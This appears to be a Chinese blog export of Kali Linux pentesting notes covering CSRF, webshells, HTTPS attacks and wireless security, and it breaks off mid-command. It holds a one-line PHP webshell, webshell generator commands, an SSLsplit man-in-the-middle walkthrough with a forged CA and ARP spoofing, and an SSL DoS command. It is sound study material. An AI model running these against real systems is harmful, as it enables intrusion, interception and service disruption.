中安全级别会检测请求的跳转来源（refer字段）</span><br><span class="line"># 高安全级别会首先验证旧密码</span><br><span class="line"># burpsuite能够根据get请求自动生产对应的CSRF post请求</span><br><span class="line">防御对策：</span><br><span class="line">    在请求和响应过程中检查是否存在anti-CSRF token名</span><br><span class="line">    检查服务器是否验证anti-CSRF token的名值</span><br><span class="line">    检查token中可编辑的字符串</span><br><span class="line">    检查referrer头是否可以伪造</span><br><span class="line">    Captcha</span><br><span class="line">    anti-CSRF token</span><br><span class="line">    Referrer头</span><br><span class="line">    降低会话超时时间</span><br></pre></td></tr></table></figure><h4 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php echo shell exec($_ GET['cmd']);?&gt; #一句话shell</span><br><span class="line">中国菜刀: http://www.maicaidao.co/</span><br><span class="line">可能被IDS、AV、WAF、扫描器软件发现查杀</span><br><span class="line">WeBaCoo (Web Backdoor Cookie)</span><br><span class="line">    类终端的shell</span><br><span class="line">    编码通信内容通过cookie头传输，隐蔽性较强</span><br><span class="line">    cm:base64编码的命令</span><br><span class="line">    cn:服务器用于返回数据的cookie头的名</span><br><span class="line">    cp:返回信息定界符</span><br><span class="line">生成服务端</span><br><span class="line">	webacoo -g -o a.php</span><br><span class="line">客户端连接</span><br><span class="line">	webacoo -t -U http://1.1.1.1/a.php</span><br><span class="line">Weevely:</span><br><span class="line">    隐蔽的类终端PHP Webshell</span><br><span class="line">    30多个管理模块</span><br><span class="line">    执行系统命令、浏览文件系统</span><br><span class="line">    检查服务器常见配置错误</span><br><span class="line">    创建正向、反向TCP Shell连接</span><br><span class="line">    通过目标计算机代理HTTP流量</span><br><span class="line">    从目标计算机运行端C ]扫描，渗透内网</span><br><span class="line">	支持连接密码</span><br></pre></td></tr></table></figure><blockquote><p>上面的工具在新版本kali已经不再提供；最新的webshell检测工具可以参照：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlhb3ppL3AvMTI2Nzk3NzcuaHRtbA==">https://www.cnblogs.com/xiaozi/p/12679777.html<i class="fa fa-external-link-alt"></i></span></p></blockquote><h3 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h3><blockquote><p>HTTPS存在多种实现的协议</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">全站HTTPS正成为潮流趋势</span><br><span class="line">	淘宝、百度</span><br><span class="line">HTTPS的作用</span><br><span class="line">	CIA</span><br><span class="line">	解决的是信息传输过程中数据被篡改、窃取</span><br><span class="line">	加密:对称、非对称、单向</span><br><span class="line">HTTPS攻击方法</span><br><span class="line">    降级攻击</span><br><span class="line">    解密攻击(明文、证书伪造)</span><br><span class="line">    协议漏洞、实现方法的漏洞、配置不严格</span><br><span class="line">Secure socket layer #安全套接字协议</span><br><span class="line">    保证网络通信安全的加密协议</span><br><span class="line">    <span class="number">1994</span>年由Netscape开发成为统一标准</span><br><span class="line">    <span class="number">1999</span>年TLS(transport layer security)取代SSLv3</span><br><span class="line">    近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复</span><br><span class="line">        Heartbleed</span><br><span class="line">        POODLE</span><br><span class="line">        BEAST</span><br><span class="line">TLS当前最新版本1.2 #传输层安全协议</span><br><span class="line">TLS/SSL、HTTPS、 HTTP over SSL通俗上表示同意含义</span><br><span class="line">非对称加密算法 #一般用来加密交换密钥</span><br><span class="line">    Diffie Hellman key exchange</span><br><span class="line">    Rivest Shamir Adleman (RSA)</span><br><span class="line">    lliptic Curve Cryptography (ECC)</span><br><span class="line">对称加密算法</span><br><span class="line">    Data Encryption Standard (DES) / <span class="number">3</span>DES</span><br><span class="line">    Advance Encryption Standard (AES) #主流</span><br><span class="line">    International Data Encryption Algorithm (IDEA)</span><br><span class="line">    Rivest Cipher <span class="number">4</span> (RC4)</span><br><span class="line">    	WEP、TLS/SSL、 RDP、 Secure shell</span><br><span class="line">单向加密算法(HASH)</span><br><span class="line">    HASH算法		HASH值长度(bit)</span><br><span class="line">-------------------------------------</span><br><span class="line">    MD5				<span class="number">128</span></span><br><span class="line">    SHA<span class="number">-1</span>			<span class="number">160</span></span><br><span class="line">    SHA<span class="number">-2</span>			<span class="number">224</span>、<span class="number">256</span>、 <span class="number">384</span>、<span class="number">512</span></span><br><span class="line">--------------------------------------</span><br><span class="line">SHA<span class="number">-3</span>已经设计完成，但尚末广泛使用</span><br><span class="line">SHA<span class="number">-2</span>是TLS <span class="number">1.2</span> 唯一支持的单向加密算法</span><br><span class="line">碰撞攻击针对单向加密算法</span><br><span class="line">	两个不同的文件生成相同的HASH值</span><br><span class="line">SSL的弱点</span><br><span class="line">	SSL是不同的对称、非对称、单向加密算法的组合加密实现(cipher suite)</span><br><span class="line">加密算法					SSL实现中的用途</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">RAS / Diffie-Hellman		密钥交换、身份认证</span><br><span class="line">AES							加密数据，由RAS/DH完成密钥交换</span><br><span class="line">HMAC-SHA2					摘要信息</span><br><span class="line">--------------------------------------------------------                       </span><br><span class="line">    服务器端为提供更好的兼容性，选择支持大量过时cipher suite</span><br><span class="line">	协商过程中强迫降级加密强度</span><br><span class="line">	现代处理器计算能力可以在可接受的时间内破解过时加密算法</span><br><span class="line">	购买云计算资源破解</span><br></pre></td></tr></table></figure><h4 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Openssl</span><br><span class="line">    直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</span><br><span class="line">    openssl S_ client -connect www.baudu.com:443</span><br><span class="line">    openssl s_ client -tls1_2 -cipher 'ECDH-RSA-RC4 SHA' -connect</span><br><span class="line">    www.taobao.com:443</span><br><span class="line">		密钥交换-身份认证-数据加密-HASH算法</span><br><span class="line">	openssls_ client -tls1_ 2 -cipher "NULL, EXPORT,LOW,DES" -connect</span><br><span class="line">	www.taobao.com:443 (协商低安全级别cipher suite)</span><br><span class="line">	可被破解的cipher suite</span><br><span class="line">	openssI ciphers -V "NULL, EXPORT,LOW,DES"</span><br><span class="line">https://www. openssl.org/docs/ apps/ciphers.html</span><br></pre></td></tr></table></figure><h4 id="SSLyze"><a href="#SSLyze" class="headerlink" title="SSLyze"></a>SSLyze</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SSLyze</span><br><span class="line">    Python语言编写</span><br><span class="line">    检查SSL过时版本</span><br><span class="line">    检查存在弱点的cipher suite</span><br><span class="line">    扫描多站点时，支持来源文件</span><br><span class="line">    检查是否支持会话恢复</span><br><span class="line">    sslyze --regular www.taobao.com:443</span><br><span class="line">Nmap</span><br><span class="line">	nmap --script=ssl-enum-ciphers.nse www.taobao.com</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssl查询网站 https://www.sllabs.com/ssltest/</span></span><br></pre></td></tr></table></figure><h4 id="SSL-TLS中间人攻击"><a href="#SSL-TLS中间人攻击" class="headerlink" title="SSL/TLS中间人攻击"></a>SSL/TLS中间人攻击</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SSLsplit</span><br><span class="line">    透明SSL/TLS中间人攻击工具</span><br><span class="line">    对客户端伪装成服务器，对服务器伪装成普通客户端</span><br><span class="line">    伪装服务器需要伪造证书</span><br><span class="line">    支持SSL/TLS加密的SMTP、POP3、 FTP等通信中间人攻击</span><br><span class="line">利用openssl生成证书私钥</span><br><span class="line">	openssl genrsa -out ca.key 2048</span><br><span class="line">利用私钥签名伪造根证书</span><br><span class="line">	openssl req -new -x509 -days 1096 -key ca.key -out ca.crt #-x509国际标准</span><br><span class="line">启动操作系统的路由功能</span><br><span class="line">	sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">Iptables端口转发规则</span><br><span class="line">    iptables -t nat -F #清空所有规则</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 									#MSA</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 									#SMTPS</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 									#IMABS</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 									#POP3S</span><br><span class="line">    iptables -t nat -L #查看所有规则</span><br><span class="line">Arp欺骗</span><br><span class="line">	arpspoof -i ethO -t 1.1.1.2 -r 1.1.1.1</span><br><span class="line">启动SSLsplit</span><br><span class="line">	mkdir -p test/logdir</span><br><span class="line">	sslsplit -D -l connect.log -j /root/test -S logdir/ -K ca.key -C ca.crt -ssl 0.0.0.0</span><br><span class="line">	8443 tcp 0.0.0.0 8080</span><br><span class="line">被害者访问taobao、baidu、 mail.163.com</span><br><span class="line">查看日志和浏览器证书及证书报错信息</span><br><span class="line">安装服务器跟证节之后再次访问</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 注意：即便进行中间人攻击，依然难以破解登录密码，因为类似淘宝的登录页面会使用单独的加密控件</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># sslstrip工具可以突破163邮箱的加密</span></span></span><br></pre></td></tr></table></figure><h4 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a>SSL/TLS拒绝服务攻击</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">thc-ssl-dos</span><br><span class="line">    SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</span><br><span class="line">    利用SSL secure Renegotiation特性，在单- :TCP连接中生成数千个SSL重连接请</span><br><span class="line">    求，造成服务器资源过载</span><br><span class="line">    与流量式拒绝服务攻击不同，the ssI-dos可以利用dsI线路打垮30G带宽的服务器</span><br><span class="line">    服务器平均可以处理300次/秒SSL握手请求</span><br><span class="line">    对SMTPS、POP3S等 服务同样有效</span><br><span class="line">    thc-ssl-dos 199.223.209.205 2083 --accept</span><br><span class="line">对策</span><br><span class="line">    禁用SSL Renegotiation（重协商）、使用SSL Accelerator</span><br><span class="line">    通过修改thc-ssl-dos代码，可以绕过以上对策</span><br></pre></td></tr></table></figure><h3 id="补充：关于AJAX和WEB-Service"><a href="#补充：关于AJAX和WEB-Service" class="headerlink" title="补充：关于AJAX和WEB Service"></a>补充：关于AJAX和WEB Service</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">AJAX对渗透测试的挑战</span><br><span class="line">    异步请求数量多且隐蔽</span><br><span class="line">    触发AJAX请求的条件无规律</span><br><span class="line">    手动和截断代理爬网可能产生大量遗漏</span><br><span class="line">AJAX爬网工具</span><br><span class="line">	ZAP</span><br><span class="line">客户端代码审计</span><br><span class="line">    源码</span><br><span class="line">    Firebug</span><br><span class="line">WEB Service</span><br><span class="line">    面向服务的架构(service oriented architecture )便于不同系统集成共享数据</span><br><span class="line">    和功能</span><br><span class="line">    尤其适合不想暴漏数据模型和程序逻辑而访问数据的场景</span><br><span class="line">    无页面</span><br><span class="line">两种类型的WEB Service</span><br><span class="line">	Simple object access protocol (SOAP)</span><br><span class="line">        传统的Web service开发方法，xml是唯一 -的数据交换格式</span><br><span class="line">        要求安全性的应用更多采用</span><br><span class="line">RESTful (Representational State Transfer architecture REST)</span><br><span class="line">	目前更多被采用的轻量web service, <span class="built_in">JSON</span>是 首选数据交换格式</span><br><span class="line">WEB Service安全考虑</span><br><span class="line">    使用API key或session token实现和跟踪身份认证</span><br><span class="line">    身份认证由服务器完成，而非客户端</span><br><span class="line">    APIkey、用户名、Session token永远不要通过URL发送</span><br><span class="line">    RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</span><br><span class="line">    SOAP提供强于HTTPS的WS-security机制</span><br><span class="line">    使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的密钥加密</span><br><span class="line">    API KEY</span><br><span class="line">    RESTful应只允许身份认证用户使用PUT、DELETE方法</span><br><span class="line">    使用随机token防止CSRT攻击</span><br><span class="line">WEB Service安全考虑</span><br><span class="line">    对用户提交参数过滤，建议布署基于严格白名单的方法</span><br><span class="line">    报错信息消毒</span><br><span class="line">    直接对象引用应严格身份验证(点上公司以ID作为主索引)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali使用教程（二）：无线攻击</title>
    <url>/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>常用的WLAN标准如下：</p><blockquote><p>802.11 - The original WLAN standard<br>802.11a- Up to 54 Mbit/s on 5 GHz<br>802.11b- 5.5 Mbit/s and 11 Mbit/s on 2.4 GHz<br>802.11g- Up to 54 Mbit/s on 2.4 GHz. Backward compatible with 802.11b<br>802.11i- Provides enhanced security<br>802.11n - Provides higher throughput with Multiple Input/Multiple Output (MIMO)</p></blockquote><a id="more"></a><p>信号干扰问题：</p><blockquote><p>2.4GHz band (2. 4GHz - 2.485GHz)，它拥有11-14个重叠的信道channels，每个信道22MHz带宽，只有三个完全不重叠的信道，所以多个2.4g信号会发送干扰</p></blockquote><p>SSID：</p><blockquote><p>Service Set ldentifier (SSID)<br>AP每秒钟约10次通过Beacon帧广播SSID<br>客户端连接到无线网络后也会宣告SSID</p></blockquote><p>MONITOR MODE</p><blockquote><p>Monitor不是一种真的无线模式，但是对无线渗透至关重要，它允许无线网卡没有任何筛选的抓包(802.11包头)，与有线网络的混杂模式可以类比，适合的网卡和驱动不但可以monitor，更可以Injection</p></blockquote><h3 id="无线网卡配置"><a href="#无线网卡配置" class="headerlink" title="无线网卡配置"></a>无线网卡配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">扫描附近AP：</span><br><span class="line">iw dev wlan2 scan| grep SSID</span><br><span class="line">iw dev wlan2 scan| egrep "DS\ Parameter\ set|SSID"</span><br><span class="line">iwlist wlan2 scanning | egrep "ESSID↓Channel"</span><br><span class="line"></span><br><span class="line">添加删除侦听端口:</span><br><span class="line">iw dev wlan2 interface add wlan2mon type monitor</span><br><span class="line">	tcpdump -S 0 -i wlan2mon -P</span><br><span class="line">iw dev wlan2mon interface del</span><br></pre></td></tr></table></figure><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><h4 id="DADIOTAP头"><a href="#DADIOTAP头" class="headerlink" title="DADIOTAP头"></a>DADIOTAP头</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">802.1帧发射和接收的事实标准，802.11依赖Radiotap完成通信过程</span><br><span class="line">Linux系统在驱动和API中内建支持Radiotap</span><br><span class="line">802.11帧发射之前，网卡驱动在802.11头前面添加Radiotap头，反之当网卡接收到</span><br><span class="line">无线帧时，驱动通知MAC层，此帧头包含Radiotap头</span><br><span class="line">Radiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定</span><br><span class="line">不破坏原始头结构，增加传递的信息</span><br><span class="line"></span><br><span class="line">组成：</span><br><span class="line">分为Header和data</span><br><span class="line">Version (8bit )</span><br><span class="line">	值始终为0</span><br><span class="line">Pad (8bit)</span><br><span class="line">	未使用，只作为字段强制对其的占位;</span><br><span class="line">Length (16bit)</span><br><span class="line">	整个radiotap头长度(可变)，作用是确定802.11头的开始位置</span><br><span class="line">Present (32bit)</span><br><span class="line">	Data段的掩码</span><br><span class="line">	Ext (1、0)</span><br><span class="line">	MAC不能理解的头部直接忽略</span><br></pre></td></tr></table></figure><h4 id="BEACON-FRAMES"><a href="#BEACON-FRAMES" class="headerlink" title="BEACON FRAMES"></a>BEACON FRAMES</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">AP发送的广播帧，通告无线网络的存在(BSSID )</span><br><span class="line">发包频率</span><br><span class="line">	<span class="number">102.4</span>ms (可变)</span><br><span class="line">	时间单位<span class="number">1024</span>ms (<span class="number">60</span>秒)</span><br><span class="line">SSID网络名</span><br><span class="line">	隐藏AP不发SSID广播</span><br><span class="line">IBSSI Status</span><br><span class="line">	<span class="number">0</span>: infrastructure</span><br><span class="line">	<span class="number">1</span>: ad-hoc</span><br><span class="line">Privicy</span><br><span class="line">	WEP、WPA</span><br><span class="line">ESSID</span><br><span class="line">	名称、长度</span><br><span class="line">速率</span><br><span class="line">	<span class="number">802.11</span> g (<span class="number">1</span><span class="number">-54</span>Mbit )</span><br><span class="line">信道</span><br><span class="line">	<span class="number">11</span></span><br></pre></td></tr></table></figure><h4 id="DATA-FRAMES"><a href="#DATA-FRAMES" class="headerlink" title="DATA FRAMES"></a>DATA FRAMES</h4><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">传输用户数据</span><br><span class="line">	<span class="built_in">DATA</span> Frame</span><br><span class="line">空数据帧</span><br><span class="line">	<span class="built_in">Null</span> <span class="built_in">data</span> frame</span><br><span class="line">	只包含MAC头和FCS</span><br><span class="line">	STA用于声明自己将要进入省电模式</span><br></pre></td></tr></table></figure><h4 id="连接无线网络完整过程"><a href="#连接无线网络完整过程" class="headerlink" title="连接无线网络完整过程"></a>连接无线网络完整过程</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">Probe</span><br><span class="line">	STA向所有信道发出probe帧，发现<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>应道Response</span><br><span class="line">Authentication</span><br><span class="line">	STA向<span class="keyword">AP</span>发出验证请求</span><br><span class="line">	发生认证过程(步骤可变)</span><br><span class="line">	<span class="keyword">AP</span>响应STA的认证结果</span><br><span class="line">Association</span><br><span class="line">	STA发出关联请求</span><br><span class="line">	<span class="keyword">AP</span>响应关联请求</span><br><span class="line">	关联成功，开始通信</span><br></pre></td></tr></table></figure><h4 id="WEP探测过程"><a href="#WEP探测过程" class="headerlink" title="WEP探测过程"></a>WEP探测过程</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Beacon标识使用WEP加密</span></span><br><span class="line"><span class="keyword">STA发送普通Probe帧</span></span><br><span class="line"><span class="keyword">AP响应Probe </span>Response帧声明其采用WEP加密</span><br></pre></td></tr></table></figure><h4 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a>WPA探测过程</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">两个AP的Beacon包内容不同，但都声明采用了WPA加密</span><br><span class="line">不同厂商对<span class="number">802.11</span>标准的实现方式不同</span><br><span class="line">包头包含WPA1字段信息</span><br></pre></td></tr></table></figure><h4 id="WEP-OPEN认证"><a href="#WEP-OPEN认证" class="headerlink" title="WEP OPEN认证"></a>WEP OPEN认证</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WEP Open认证与open认证通信过程相同</span><br><span class="line">正确认证后通信数据被WEP加密</span><br><span class="line">如果认证时客户端输入错误密码</span><br><span class="line">	认证依然可以通过</span><br><span class="line">	AP将丢弃该STA的数据包</span><br><span class="line">		起始向量被错误地密钥解密后完整性被破坏</span><br><span class="line">		但数据传输将失败</span><br><span class="line">认证响应正确，身份验证成功</span><br></pre></td></tr></table></figure><h4 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">STA发认证请求</span><br><span class="line"><span class="keyword">AP</span>返回随机Challenge消息</span><br><span class="line">STA使用PSK加密Cha并发回给<span class="keyword">AP</span></span><br><span class="line"><span class="keyword">AP</span>使用PSK解密密文，获得Cha并与</span><br><span class="line">原始Cha比对，相同则验证成功，</span><br><span class="line">不同则验证失败;</span><br><span class="line"></span><br><span class="line">大部分无线驱动首先尝试<span class="keyword">open</span>验证，如失败则尝试PSK</span><br></pre></td></tr></table></figure><h4 id="加密协议"><a href="#加密协议" class="headerlink" title="加密协议"></a>加密协议</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">无线安全根源</span><br><span class="line">	<span class="number">802.11</span>基于无线电波发射信息</span><br><span class="line">	嗅探侦听是主要问题</span><br><span class="line">	加密机制是必须手段</span><br><span class="line">Wired Equivalent Privacy (WEP)</span><br><span class="line">	<span class="number">802.11</span>标准的一部分</span><br><span class="line">	发布后不久被发现存在安全漏洞</span><br><span class="line">WI-Fi Protected Access (WPA)取代WEP</span><br><span class="line">	WPA2 (<span class="number">802.11</span>i标准)</span><br></pre></td></tr></table></figure><h4 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a>OPEN无加密网络</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">无任何加密机制</span><br><span class="line">所有数据都可以被嗅探</span><br><span class="line">STA和<span class="keyword">AP</span>只协商拼配参数即可连入网络</span><br></pre></td></tr></table></figure><h3 id="WEP加密算法"><a href="#WEP加密算法" class="headerlink" title="WEP加密算法"></a>WEP加密算法</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">使用Rivest Cipher <span class="number">4</span> (RC4)算法加密流量内容，实现机密性</span><br><span class="line">CRC32算法检查数据完整性</span><br><span class="line">标准采用使用<span class="number">24</span>位initialization <span class="type">vector</span> (IV)</span><br><span class="line">受美国加密技术出C限制法律的要求：</span><br><span class="line">	高于<span class="number">64</span>bit <span class="type">key</span>禁止出口</span><br><span class="line">	所以除<span class="number">24</span>bit IV之外真实的<span class="type">key</span>只有<span class="number">40</span>bit的版本被允许出口</span><br><span class="line">	出口限制法律撤销后实现了<span class="number">128</span>bit <span class="type">key</span>的WEP版本(使用相同的<span class="number">24</span>bit IV)</span><br></pre></td></tr></table></figure><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">RSA实验室研发的对称加密-流算法：</span><br><span class="line">	实现简单</span><br><span class="line">	速度快</span><br><span class="line">	</span><br><span class="line">加密:对明文流和密钥流进行<span class="keyword">XOR</span>计算</span><br><span class="line">解密:对密文流和密钥流进行<span class="keyword">XOR</span>计算</span><br><span class="line">RC4算法<span class="built_in">key</span>由两个过程生成：</span><br><span class="line">	合并IV（起始向量）和PSK（共享密钥），利用<span class="built_in">Key</span> Scheduling <span class="built_in">Algorithm</span> (KSA)算法生成起始状态表</span><br><span class="line">	Pseudo -Random Generation <span class="built_in">Algorithm</span> (PRGA)算法生成最终密钥流</span><br></pre></td></tr></table></figure><h3 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Wi-Fi <span class="keyword">Protected</span> <span class="keyword">Access</span></span><br><span class="line"><span class="number">802.11</span>i组为提高无线安全，开发两个新的链路层加密协议</span><br><span class="line">	Temporal Key Integrity Protocol (TKIP)</span><br><span class="line">		WPA1 (较之WEP可动态改变密钥)</span><br><span class="line">	Counter Mode <span class="keyword">with</span> CBC-MAC (CCMP)</span><br><span class="line">		WPA2</span><br><span class="line">WPA加密两种安全类型</span><br><span class="line">	WPA个人:使用预设共享密钥实现身份验证</span><br><span class="line">	WPA企业:使用<span class="number">802</span>. <span class="number">1</span>X和Radius服务器实现AAA</span><br></pre></td></tr></table></figure><h4 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a>WPA1</h4><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">802.11</span>i第三版草案</span><br><span class="line">与WEP比较：</span><br><span class="line">	都采用逐包进行密钥加密</span><br><span class="line">	<span class="number">128</span>位的<span class="type">key</span>和<span class="number">48</span>位的初向量(IV)</span><br><span class="line">	RC4流加密数据</span><br><span class="line">	帧计数器避免重放攻击</span><br><span class="line">	TKIP使用Michael算法进行完整性校验(MIC )</span><br><span class="line">		WEP CRC32</span><br><span class="line">	兼容早期版本硬件</span><br></pre></td></tr></table></figure><h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">依据802.11i完全重新设计实现</span><br><span class="line">	也被称为Robust Security<span class="built_in"> Network </span>(RSN)</span><br><span class="line">	CCMP替代TKIP</span><br><span class="line">	AES加密算法取代了RC4</span><br><span class="line">	不兼容早期版本硬件</span><br></pre></td></tr></table></figure><h4 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a>WPA企业连接过程</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协商安全协议</span><br><span class="line">身份认证</span><br><span class="line">密钥分发和验证</span><br><span class="line">数据加密完整性</span><br></pre></td></tr></table></figure><h4 id="WPA-PSK"><a href="#WPA-PSK" class="headerlink" title="WPA-PSK"></a>WPA-PSK</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协商安全协议</span><br><span class="line">密钥分发和验证</span><br><span class="line">数据加密完整性</span><br></pre></td></tr></table></figure><h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">WPA四步握手过程生成PTK：</span><br><span class="line">	<span class="keyword">AP</span>发送Anonce给STA</span><br><span class="line">	STA生成Snonce计算出PTK</span><br><span class="line">	Snonce加PTK的MIC发给<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>拿到Snonce计算出PTK</span><br><span class="line">	<span class="keyword">AP</span>计算MIC与接收的MIC比对</span><br><span class="line">	MIC一致说明确定STA知道PMK</span><br><span class="line">	<span class="keyword">AP</span>发GTK给STA</span><br><span class="line">	STA回复ACK并使用密钥加密</span><br></pre></td></tr></table></figure><h3 id="无线渗透测试"><a href="#无线渗透测试" class="headerlink" title="无线渗透测试"></a>无线渗透测试</h3><h4 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a>AIRCRACK-NG基础</h4><blockquote><p>无线渗透和审计神器，包含各种功能的工具套件，支持：<br>网络检测<br>嗅探抓包<br>包注入<br>密码破解</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng check #检测是否存在冲突</span><br><span class="line">airmon check kill #杀掉冲突进程</span><br><span class="line"></span><br><span class="line">airmon start wlan2 3  #开启网卡监听模式，工作在3信道</span><br><span class="line">iwlist wlan2mon channel #查看工作信道</span><br><span class="line">airmon stop wlan2mon #关闭监听监听模式</span><br></pre></td></tr></table></figure><h4 id="AIRODUMP-NG"><a href="#AIRODUMP-NG" class="headerlink" title="AIRODUMP-NG"></a>AIRODUMP-NG</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">无线抓包</span><br><span class="line">airodump-ng wlan2mon #在所有信道进行轮询监听数据包</span><br><span class="line">airodump wlan2mon -C 1 --bssid 00:1 1:22:33:44:55 -W file.cap</span><br><span class="line"><span class="meta">	#</span><span class="bash">抓取指定信道、指定AP的数据包，并保存到文件中</span></span><br><span class="line">aireplay -9 wlan2mon</span><br><span class="line">airreplay</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    BSSID: AP的MAC地址</span><br><span class="line">    PWR:网卡接收到的信号强度，距离越近信号越强</span><br><span class="line">    -1:驱动不支持信号强度、STA距离超出信号接受范围</span><br><span class="line">    RXQ:最近10秒成功接收的数据帧的百分比(数据帧、管理帧)，只有在固定信道</span><br><span class="line">    时才会出现，</span><br><span class="line">    Beacons:接收到此AP发送的beacon帧数量</span><br><span class="line">    #Data:抓到的数据帧数量(WEP表示|IV数量) ，包含广播数据帧</span><br><span class="line">    #/s:最近10秒内，每秒平均抓到的帧的数量</span><br><span class="line">    CH:信道号(从beacon帧中获得)，信道重叠时可能发现其他信道</span><br><span class="line">    MB: AP支持的最大速率</span><br><span class="line">    ENC:采用的无线安全技术WEP、WPA、WPA2、OPEN</span><br><span class="line">    CIPHER:采用的加密套件CCMP、TKIP、 WEP40、WEP104</span><br><span class="line">    AUTH:身份认证方法MGT、PSK、 SKA、OPEN</span><br><span class="line">    ESSID:无线网络名称，隐藏AP此值可能为空，airodump从probe和</span><br><span class="line">    association request帧中发现隐藏AP</span><br><span class="line">    STATION: STA的MAC地址</span><br><span class="line">    Lost:通过sequence number判断最近10秒STA发送丢失的数据包数量(管</span><br><span class="line">    理帧、数据帧)</span><br><span class="line">    	干扰、距离</span><br><span class="line">    	发包不能收、收包不能发</span><br><span class="line">    Packets: STA发送的数据包数量</span><br><span class="line">    Probes: STA探测的ESSID</span><br></pre></td></tr></table></figure><h4 id="AIRPLAY-NG"><a href="#AIRPLAY-NG" class="headerlink" title="AIRPLAY-NG"></a>AIRPLAY-NG</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">产生或者加速无线通信流量</span><br><span class="line">	向无线网络中注入数据包</span><br><span class="line">		伪造身份验证</span><br><span class="line">		强制重新身份验证</span><br><span class="line">		抓包重放</span><br><span class="line">	用于后续WEP和WPA密码破解</span><br><span class="line">	支持10种包注入</span><br><span class="line">获取包的两种途径</span><br><span class="line">	指定接口(-i)</span><br><span class="line">	抓包文件pcap (-r)</span><br><span class="line">使用：</span><br><span class="line">aireplay-ng &lt;options&gt; &lt;interface 